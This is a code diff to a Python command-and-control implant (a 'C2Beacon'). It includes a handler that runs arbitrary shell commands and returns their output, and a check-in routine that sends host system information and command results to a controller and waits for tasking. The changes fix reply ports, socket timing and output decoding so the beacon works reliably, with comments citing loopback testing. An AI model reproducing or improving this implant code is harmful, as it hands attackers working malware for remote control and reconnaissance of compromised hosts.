@@ -45,11 +45,13 @@ def _handle_shell(cmd: str, timeout: int = 30) -> dict:
     """Execute a shell command and return stdout/stderr."""
     try:
         result = subprocess.run(
-            cmd, shell=True, capture_output=True, text=True, timeout=timeout
+            cmd, shell=True, capture_output=True, timeout=timeout
         )
+        stdout = result.stdout.decode("utf-8", errors="replace")
+        stderr = result.stderr.decode("utf-8", errors="replace")
         return {
-            "stdout":    result.stdout[:4096],
-            "stderr":    result.stderr[:1024],
+            "stdout":     stdout[:4096],
+            "stderr":     stderr[:1024],
             "returncode": result.returncode,
         }
     except subprocess.TimeoutExpired:
@@ -140,6 +142,9 @@ class C2Beacon:
         self.max_ttl    = max_ttl       # 0 = run forever
         self.session_id = _make_session_id()
         self.transport  = C2Transport(domain_id=domain_id, key=key)
+        # Beacon listens on participant_id=1 port to avoid colliding with the
+        # server which listens on participant_id=0 (needed for loopback testing)
+        self.reply_port = self.transport._user_port(participant_id=1)
         self._stop      = threading.Event()
         self._seq       = 0
         self._pending_results: list = []
@@ -174,14 +179,9 @@ class C2Beacon:
 
     def _checkin(self) -> Optional[C2Packet]:
         """Send a BEACON packet. Returns any tasking packet received in reply."""
-        info = _handle_sysinfo()
-        info["results"] = self._pending_results
-        self._pending_results = []
-
-        ok = self._send(MsgType.BEACON, info)
-        self._log(f"check-in {'ok' if ok else 'failed'}")
-
-        # Brief listen window for tasking response
+        # Start listener BEFORE sending the beacon — on loopback the server
+        # replies almost instantly and the packet would arrive before the socket
+        # is bound if we started the thread after sending.
         tasking: list = []
         stop_listen = threading.Event()
 
@@ -190,13 +190,22 @@ class C2Beacon:
                 tasking.append(pkt)
                 stop_listen.set()
 
-        port = self.transport._user_port()
         t = threading.Thread(
             target=self.transport.listen,
-            args=(port, _collect, stop_listen, False),
+            args=(self.reply_port, _collect, stop_listen, False),
             daemon=True,
         )
         t.start()
+        time.sleep(0.05)  # let the socket bind before we send
+
+        info = _handle_sysinfo()
+        info["results"]    = self._pending_results
+        info["reply_port"] = self.reply_port
+        self._pending_results = []
+
+        ok = self._send(MsgType.BEACON, info)
+        self._log(f"check-in {'ok' if ok else 'failed'}")
+
         stop_listen.wait(timeout=5.0)
         stop_listen.set()
 
